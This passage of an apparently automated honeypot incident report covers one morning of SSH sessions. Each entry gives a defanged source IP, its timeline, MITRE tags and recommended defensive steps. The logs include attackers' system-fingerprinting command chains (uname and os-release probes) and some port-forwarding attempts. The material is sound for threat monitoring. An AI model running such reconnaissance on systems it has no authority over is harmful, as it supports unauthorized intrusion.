| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:09 |
| **Last Seen** | 2026-07-22 05:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:09:57` | `cowrie.session.connect` |
| `2026-07-22 05:09:57` | `cowrie.client.version` |
| `2026-07-22 05:09:57` | `cowrie.client.kex` |
| `2026-07-22 05:09:59` | `cowrie.login.success` |
| `2026-07-22 05:10:00` | `cowrie.session.params` |
| `2026-07-22 05:10:00` | `cowrie.command.input` |
| `2026-07-22 05:10:00` | `cowrie.command.input` |
| `2026-07-22 05:10:00` | `cowrie.command.input` |
| `2026-07-22 05:10:00` | `cowrie.command.input` |
| `2026-07-22 05:10:00` | `cowrie.command.input` |
| `2026-07-22 05:10:00` | `cowrie.command.success` |
| `2026-07-22 05:10:00` | `cowrie.command.input` |
| `2026-07-22 05:10:00` | `cowrie.command.input` |
| `2026-07-22 05:10:00` | `cowrie.command.input` |
| `2026-07-22 05:10:00` | `cowrie.command.input` |
| `2026-07-22 05:10:01` | `cowrie.log.closed` |
| `2026-07-22 05:10:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88e485c76498

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:11 |
| **Last Seen** | 2026-07-22 05:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:11:08` | `cowrie.session.connect` |
| `2026-07-22 05:11:08` | `cowrie.client.version` |
| `2026-07-22 05:11:08` | `cowrie.client.kex` |
| `2026-07-22 05:11:08` | `cowrie.login.success` |
| `2026-07-22 05:11:09` | `cowrie.session.params` |
| `2026-07-22 05:11:09` | `cowrie.command.input` |
| `2026-07-22 05:11:09` | `cowrie.log.closed` |
| `2026-07-22 05:11:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bea5f617377

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:11 |
| **Last Seen** | 2026-07-22 05:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:11:52` | `cowrie.session.connect` |
| `2026-07-22 05:11:52` | `cowrie.client.version` |
| `2026-07-22 05:11:52` | `cowrie.client.kex` |
| `2026-07-22 05:11:53` | `cowrie.login.success` |
| `2026-07-22 05:11:55` | `cowrie.session.params` |
| `2026-07-22 05:11:55` | `cowrie.command.input` |
| `2026-07-22 05:11:55` | `cowrie.command.input` |
| `2026-07-22 05:11:55` | `cowrie.command.input` |
| `2026-07-22 05:11:55` | `cowrie.command.input` |
| `2026-07-22 05:11:55` | `cowrie.command.input` |
| `2026-07-22 05:11:55` | `cowrie.command.success` |
| `2026-07-22 05:11:55` | `cowrie.command.input` |
| `2026-07-22 05:11:55` | `cowrie.command.input` |
| `2026-07-22 05:11:55` | `cowrie.command.input` |
| `2026-07-22 05:11:55` | `cowrie.command.input` |
| `2026-07-22 05:11:55` | `cowrie.log.closed` |
| `2026-07-22 05:11:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce036eb2d9d0

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]157` |
| **First Seen** | 2026-07-22 05:12 |
| **Last Seen** | 2026-07-22 05:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:12:03` | `cowrie.session.connect` |
| `2026-07-22 05:12:04` | `cowrie.client.version` |
| `2026-07-22 05:12:04` | `cowrie.client.kex` |
| `2026-07-22 05:12:05` | `cowrie.login.success` |
| `2026-07-22 05:12:06` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]157` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24023b93287d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:13 |
| **Last Seen** | 2026-07-22 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:13:16` | `cowrie.session.connect` |
| `2026-07-22 05:13:16` | `cowrie.client.version` |
| `2026-07-22 05:13:16` | `cowrie.client.kex` |
| `2026-07-22 05:13:16` | `cowrie.login.success` |
| `2026-07-22 05:13:17` | `cowrie.session.params` |
| `2026-07-22 05:13:17` | `cowrie.command.input` |
| `2026-07-22 05:13:17` | `cowrie.log.closed` |
| `2026-07-22 05:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-547c1e509ab5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:13 |
| **Last Seen** | 2026-07-22 05:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:13:46` | `cowrie.session.connect` |
| `2026-07-22 05:13:46` | `cowrie.client.version` |
| `2026-07-22 05:13:46` | `cowrie.client.kex` |
| `2026-07-22 05:13:47` | `cowrie.login.success` |
| `2026-07-22 05:13:49` | `cowrie.session.params` |
| `2026-07-22 05:13:49` | `cowrie.command.input` |
| `2026-07-22 05:13:49` | `cowrie.command.input` |
| `2026-07-22 05:13:49` | `cowrie.command.input` |
| `2026-07-22 05:13:49` | `cowrie.command.input` |
| `2026-07-22 05:13:49` | `cowrie.command.input` |
| `2026-07-22 05:13:49` | `cowrie.command.success` |
| `2026-07-22 05:13:49` | `cowrie.command.input` |
| `2026-07-22 05:13:49` | `cowrie.command.input` |
| `2026-07-22 05:13:49` | `cowrie.command.input` |
| `2026-07-22 05:13:49` | `cowrie.command.input` |
| `2026-07-22 05:13:49` | `cowrie.log.closed` |
| `2026-07-22 05:13:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9be4e48786a

| Field | Detail |
|---|---|
| **Source IP** | `176.170.1[.]244` |
| **First Seen** | 2026-07-22 05:14 |
| **Last Seen** | 2026-07-22 05:14 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:14:03` | `cowrie.session.connect` |
| `2026-07-22 05:14:06` | `cowrie.client.version` |
| `2026-07-22 05:14:09` | `cowrie.client.kex` |
| `2026-07-22 05:14:14` | `cowrie.login.success` |
| `2026-07-22 05:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.170.1[.]244` to AbuseIPDB if not already reported
- [ ] Block `176.170.1[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b4468c5d13

| Field | Detail |
|---|---|
| **Source IP** | `92.126.223[.]175` |
| **First Seen** | 2026-07-22 05:14 |
| **Last Seen** | 2026-07-22 05:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:14:18` | `cowrie.session.connect` |
| `2026-07-22 05:14:18` | `cowrie.client.version` |
| `2026-07-22 05:14:18` | `cowrie.client.kex` |
| `2026-07-22 05:14:20` | `cowrie.login.success` |
| `2026-07-22 05:14:20` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.126.223[.]175` to AbuseIPDB if not already reported
- [ ] Block `92.126.223[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e76cbe62888b

| Field | Detail |
|---|---|
| **Source IP** | `103.174.80[.]40` |
| **First Seen** | 2026-07-22 05:15 |
| **Last Seen** | 2026-07-22 05:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:15:25` | `cowrie.session.connect` |
| `2026-07-22 05:15:26` | `cowrie.client.version` |
| `2026-07-22 05:15:26` | `cowrie.client.kex` |
| `2026-07-22 05:15:28` | `cowrie.login.success` |
| `2026-07-22 05:15:29` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.80[.]40` to AbuseIPDB if not already reported
- [ ] Block `103.174.80[.]40` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a58c3b9e7ebe

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:15 |
| **Last Seen** | 2026-07-22 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:15:26` | `cowrie.session.connect` |
| `2026-07-22 05:15:26` | `cowrie.client.version` |
| `2026-07-22 05:15:26` | `cowrie.client.kex` |
| `2026-07-22 05:15:26` | `cowrie.login.success` |
| `2026-07-22 05:15:27` | `cowrie.session.params` |
| `2026-07-22 05:15:27` | `cowrie.command.input` |
| `2026-07-22 05:15:27` | `cowrie.log.closed` |
| `2026-07-22 05:15:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7dd82015001

| Field | Detail |
|---|---|
| **Source IP** | `49.124.154[.]163` |
| **First Seen** | 2026-07-22 05:15 |
| **Last Seen** | 2026-07-22 05:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:15:34` | `cowrie.session.connect` |
| `2026-07-22 05:15:35` | `cowrie.client.version` |
| `2026-07-22 05:15:35` | `cowrie.client.kex` |
| `2026-07-22 05:15:36` | `cowrie.login.success` |
| `2026-07-22 05:15:37` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:15:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.154[.]163` to AbuseIPDB if not already reported
- [ ] Block `49.124.154[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d070b053867

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:15 |
| **Last Seen** | 2026-07-22 05:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:15:37` | `cowrie.session.connect` |
| `2026-07-22 05:15:37` | `cowrie.client.version` |
| `2026-07-22 05:15:37` | `cowrie.client.kex` |
| `2026-07-22 05:15:39` | `cowrie.login.success` |
| `2026-07-22 05:15:40` | `cowrie.session.params` |
| `2026-07-22 05:15:40` | `cowrie.command.input` |
| `2026-07-22 05:15:40` | `cowrie.command.input` |
| `2026-07-22 05:15:40` | `cowrie.command.input` |
| `2026-07-22 05:15:40` | `cowrie.command.input` |
| `2026-07-22 05:15:40` | `cowrie.command.input` |
| `2026-07-22 05:15:40` | `cowrie.command.success` |
| `2026-07-22 05:15:40` | `cowrie.command.input` |
| `2026-07-22 05:15:40` | `cowrie.command.input` |
| `2026-07-22 05:15:40` | `cowrie.command.input` |
| `2026-07-22 05:15:40` | `cowrie.command.input` |
| `2026-07-22 05:15:41` | `cowrie.log.closed` |
| `2026-07-22 05:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7840fad83487

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:17 |
| **Last Seen** | 2026-07-22 05:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:17:26` | `cowrie.session.connect` |
| `2026-07-22 05:17:26` | `cowrie.client.version` |
| `2026-07-22 05:17:26` | `cowrie.client.kex` |
| `2026-07-22 05:17:28` | `cowrie.login.success` |
| `2026-07-22 05:17:29` | `cowrie.session.params` |
| `2026-07-22 05:17:29` | `cowrie.command.input` |
| `2026-07-22 05:17:29` | `cowrie.command.input` |
| `2026-07-22 05:17:29` | `cowrie.command.input` |
| `2026-07-22 05:17:29` | `cowrie.command.input` |
| `2026-07-22 05:17:29` | `cowrie.command.input` |
| `2026-07-22 05:17:29` | `cowrie.command.success` |
| `2026-07-22 05:17:29` | `cowrie.command.input` |
| `2026-07-22 05:17:29` | `cowrie.command.input` |
| `2026-07-22 05:17:29` | `cowrie.command.input` |
| `2026-07-22 05:17:29` | `cowrie.command.input` |
| `2026-07-22 05:17:30` | `cowrie.log.closed` |
| `2026-07-22 05:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-451f3f1ee32f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:17 |
| **Last Seen** | 2026-07-22 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:17:41` | `cowrie.session.connect` |
| `2026-07-22 05:17:41` | `cowrie.client.version` |
| `2026-07-22 05:17:41` | `cowrie.client.kex` |
| `2026-07-22 05:17:41` | `cowrie.login.success` |
| `2026-07-22 05:17:42` | `cowrie.session.params` |
| `2026-07-22 05:17:42` | `cowrie.command.input` |
| `2026-07-22 05:17:42` | `cowrie.log.closed` |
| `2026-07-22 05:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5f2ce0fb704

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:19 |
| **Last Seen** | 2026-07-22 05:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:19:13` | `cowrie.session.connect` |
| `2026-07-22 05:19:13` | `cowrie.client.version` |
| `2026-07-22 05:19:13` | `cowrie.client.kex` |
| `2026-07-22 05:19:15` | `cowrie.login.success` |
| `2026-07-22 05:19:16` | `cowrie.session.params` |
| `2026-07-22 05:19:16` | `cowrie.command.input` |
| `2026-07-22 05:19:16` | `cowrie.command.input` |
| `2026-07-22 05:19:16` | `cowrie.command.input` |
| `2026-07-22 05:19:16` | `cowrie.command.input` |
| `2026-07-22 05:19:16` | `cowrie.command.input` |
| `2026-07-22 05:19:16` | `cowrie.command.success` |
| `2026-07-22 05:19:16` | `cowrie.command.input` |
| `2026-07-22 05:19:16` | `cowrie.command.input` |
| `2026-07-22 05:19:16` | `cowrie.command.input` |
| `2026-07-22 05:19:16` | `cowrie.command.input` |
| `2026-07-22 05:19:16` | `cowrie.log.closed` |
| `2026-07-22 05:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-038aee556b2b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:19 |
| **Last Seen** | 2026-07-22 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:19:54` | `cowrie.session.connect` |
| `2026-07-22 05:19:54` | `cowrie.client.version` |
| `2026-07-22 05:19:54` | `cowrie.client.kex` |
| `2026-07-22 05:19:54` | `cowrie.login.success` |
| `2026-07-22 05:19:55` | `cowrie.session.params` |
| `2026-07-22 05:19:55` | `cowrie.command.input` |
| `2026-07-22 05:19:55` | `cowrie.log.closed` |
| `2026-07-22 05:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd3ae13f3a50

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:21 |
| **Last Seen** | 2026-07-22 05:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:21:01` | `cowrie.session.connect` |
| `2026-07-22 05:21:01` | `cowrie.client.version` |
| `2026-07-22 05:21:01` | `cowrie.client.kex` |
| `2026-07-22 05:21:02` | `cowrie.login.success` |
| `2026-07-22 05:21:04` | `cowrie.session.params` |
| `2026-07-22 05:21:04` | `cowrie.command.input` |
| `2026-07-22 05:21:04` | `cowrie.command.input` |
| `2026-07-22 05:21:04` | `cowrie.command.input` |
| `2026-07-22 05:21:04` | `cowrie.command.input` |
| `2026-07-22 05:21:04` | `cowrie.command.input` |
| `2026-07-22 05:21:04` | `cowrie.command.success` |
| `2026-07-22 05:21:04` | `cowrie.command.input` |
| `2026-07-22 05:21:04` | `cowrie.command.input` |
| `2026-07-22 05:21:04` | `cowrie.command.input` |
| `2026-07-22 05:21:04` | `cowrie.command.input` |
| `2026-07-22 05:21:05` | `cowrie.log.closed` |
| `2026-07-22 05:21:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-053cdecc5f52

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-22 05:21 |
| **Last Seen** | 2026-07-22 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:21:14` | `cowrie.session.connect` |
| `2026-07-22 05:21:14` | `cowrie.client.version` |
| `2026-07-22 05:21:14` | `cowrie.client.kex` |
| `2026-07-22 05:21:15` | `cowrie.login.success` |
| `2026-07-22 05:21:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-661c348e3f42

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-22 05:21 |
| **Last Seen** | 2026-07-22 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
